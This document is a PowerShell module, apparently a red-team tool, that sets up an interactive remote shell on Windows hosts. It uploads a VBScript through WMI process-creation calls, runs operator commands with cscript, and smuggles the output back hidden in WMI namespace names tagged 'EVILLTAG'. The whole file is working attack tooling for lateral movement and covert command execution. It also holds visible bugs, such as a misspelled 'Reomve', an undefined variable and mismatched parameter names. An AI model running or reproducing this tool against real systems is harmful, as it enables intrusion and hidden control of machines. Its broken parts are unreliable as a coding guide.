function New-WmiShell{
<#
.SYNOPSIS
Setup interactive shell on a remote host leveraging the WMI service and a VBScript.

.DESCRIPTION
New-WmiShell tests connectivity with the WMI service and uploads a VBScript to the remote host(s). The uploaded 
VBScript will receive and execute shell commands via the WMI service and process the output of those commands.
 

.PARAMETER ComputerName 

.PARAMETER UserName

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> New-WmiShell -ComputerName server01 -UserName 'DOMAIN\Administrator' -UploadTo %TEMP% -Encoding Base64

.NOTES
Version: 1.0
Author : Jesse "RBOT" Davis

.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
		[Parameter(Mandatory = $True)]
		[string]$UploadTo,
		[Parameter(Mandatory = $True)]
		[ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param
	
	BEGIN
	{
		
		#Store credentials for use on remote host(s)
		$creds = Get-Credential -Credential $UserName
		
		# Read VBScript into []
		if ($Encoding -eq "Base64") { $vbScript = gc -Encoding UTF8 .\base64.vbs }
		else { $vbScript = gc -Encoding UTF8 .\hex.vbs }
	}
	
	PROCESS
	{	
		$wmiOn = @()
		$wmiOff = @()
		
		foreach ($name in $ComputerName)
		{			
			#Generate random name for VBScript
			$vbsName = [System.IO.Path]::GetRandomFileName() + ".vbs"
			
			#Grab some data about the host, validation of WMI accessibility
			$os = gwmi -ComputerName $name -Credential $creds -Class Win32_OperatingSystem
			$comp = gwmi -ComputerName $name -Credential $creds -Class Win32_ComputerSystem
			#$env = gwmi -Credential $creds -Class Win32_Environment -ComputerName $computer
			
			$props = @{
				'HostName' = $os.CSName;
				'Maufacturer' = $comp.Manufacturer;
				'Model' = $comp.Model;
				'OS' = $os.Caption;
				'OSVersion' = $os.Version;
				'ServicePack' = $os.ServicePackMajorVerison;
				'Workgroup' = $comp.Workgroup;
				'PartOfDomain' = $comp.PartOfDomain;
				'Domain' = $comp.Domain;
				'OSArchitecture' = $os.OSArchitecture;
				'SystemType' = $comp.SystemType;
				'DEP_32BitApps' = $os.DataExecutionPrevention_32BitApplications;
				'DEP_Available' = $os.DataExecutionPrevention_Available;
				'DEP_Drivers' = $os.DataExecutionPrevention_Drivers;
				'SystemDrive' = $os.SystemDrive;
				'TotalPhysicalMemory' = $comp.TotalPhysicalMemory;
				'Credentials' = $creds;
				'vbsName' = $vbsName;
				'vbsLocation' = $UploadTo;
				'Encoding' = $Encoding;
				'ComputerName' = $ComputerName;
			}
			$obj = New-Object -TypeName PSObject -Property $props
			
			if ($obj.ComputerName) {
				Write-Host -ForegroundColor Green "+ WMI is accessible on $($obj.ComputerName) +"
				$wmiOn += $obj
			}
			else {
				Write-Host -ForegroundColor Yellow "- WMI is not accessible on $($ComputerName) -"
				$wmiOff += $ComputerName
			}	
		}
		
		foreach ($computer in $wmiOn) {
	
			#Upload VBScript to Host
			foreach ($line in $vbScript) {

				$argList = "cmd.exe /c echo $($line) >> $($computer.vbsLocation)\$($computer.vbsName)"
				iwmi -ComputerName $computer.ComputerName -Credential $computer.Credentials -Class win32_process -Name create -ArgumentList $argList | Out-Null
				
				# Status-bar
				Write-Progress -Status "Please Wait..." -Activity "Uploading VBScript: $($computer.vbsName) to: $($computer.HostName) in $($UploadTo)" -PercentComplete (($line.ReadCount / $vbScript.Length) * 100)
			}
			
			#Validate functionality
			$cScript = "cmd.exe /c cscript.exe $($computer.vbsLocation)\$($computer.vbsName) `"whoami /priv`""
			iwmi -ComputerName $computer.ComputerName -Credential $computer.Credentials -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            
            # Wait for vbScrpit to finish writing output to WMI namespaces
            $outputReady = [NullString]::Value
            do{$outputReady = gwmi -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
            until($outputReady)

			Get-WmiShellOutput -UserName $computer.Credentials -ComputerName $computer.ComputerName -Encoding $computer.Encoding
		}
	}
	
	END {Write-Host -ForegroundColor Green $wmiOn.ComputerName
         Write-Host -ForegroundColor Yellow $wmiOff}
}
function Enter-WmiShell{

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
		[Parameter(Mandatory = $True)]
		[string]$UploadTo,
		[Parameter(Mandatory = $True)]
		[ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param

        # Drop into WmiShell prompt
        $command = [NullString]::Value
        Clear-Host
        $a = (Get-Host).UI.RawUI
        $a.BackgroundColor = "black"
        Clear-Host

        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green -backgroundcolor black 
            $command = Read-Host

            # Execute commands on remote host using cscript.exe and uploaded VBScript
            $cScript = "cmd.exe /c cscript.exe $($UploadTo)\$($vbsName) `"$($command)`""
            iwmi -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            
            if ($command -ne "exit") {

                # Wait for vbScrpit to finish writing output to WMI namespaces
                $outputReady = [NullString]::Value
                do{$outputReady = gwmi -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                until($outputReady)

                # Retrieve cmd output written to WMI namespaces 
                Get-WmiShellOutput -Credential $UserName -ComputerName $ComputerName -Encoding $Encoding
            }
        }until($command -eq "exit")

        $a.BackgroundColor = "DarkMagenta"
        Clear-Host
}
function Get-WmiShellOutput{
<#
.SYNOPSIS
Retrieve output stored in WMI namspaces and decode it.

.DESCRIPTION
Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded output, decode the retrieved data and write it to stdout.
 
.PARAMETER ComputerName 

.PARAMETER Credential

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> New-WmiShell -Credential Administrator

.NOTES
Version: 1.0
Author : Jesse "RBOT" Davis

.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param
	
	$getOutput = @()
	$getOutput = gwmi -Credential $UserName -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
	
	if ([BOOL]$getOutput.Length) {
		
		#Read string objects into array, then sort them
		$getStrings = for ($i = 0; $i -lt $getOutput.Length; $i++) { $getOutput[$i].Name }
		$sortStrings = $getStrings | Sort-Object
		
		if ($Encoding -eq "Base64") {
			
            #Decode Base64 output
			foreach ($line in $sortStrings) {
	
				#Replace non-base64 characters
				$cleanString = $line.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
				
				#Add necessary base64 padding character
				if ($cleanString.Length % 3 -eq 0) { $base64Pad = $cleanString }
				else { $base64Pad = $cleanString + ("=" * (3 - ($cleanString.Length % 3))) }
				
				# Decode base64 padded string and remove front side spaces
				$decodeString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Pad)).Remove(0, 8))
				
				# Remove back side spaces and compile output
				$decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)
			}
            Write-Host $decodedOutput
		}
		else {
			
            #Decode Hex output
			foreach ($line in $sortStrings) {
				
				$cleanString = $line.Reomve(0, 15)
                $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
			}
		}
		
	}
	else {
        #Decode single line Base64
        if($Encoding -eq "Base64") {
		    $getStrings = $getOutput.Name
		    $cleanString = $getStrings.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
		    Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
		    Catch [System.Management.Automation.MethodInvocationException] {
			    Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
			    Catch [System.Management.Automation.MethodInvocationException]
			        { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
			    Finally {}
		        }
		    Finally { Write-Host $decodedOutput.Remove(0, 8) }
	    }
        #Decode single line Hex
        else {
            $getStrings = $getOutput.Name
            $cleanstring = $getStrings.Remove(0,15)
            $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
        }

    }
}
#End END
 #End Enum-Adapter funcion

#Enum-Adapter -ComputerName localhost,localhost,127.0.0.1 -Ping -TXT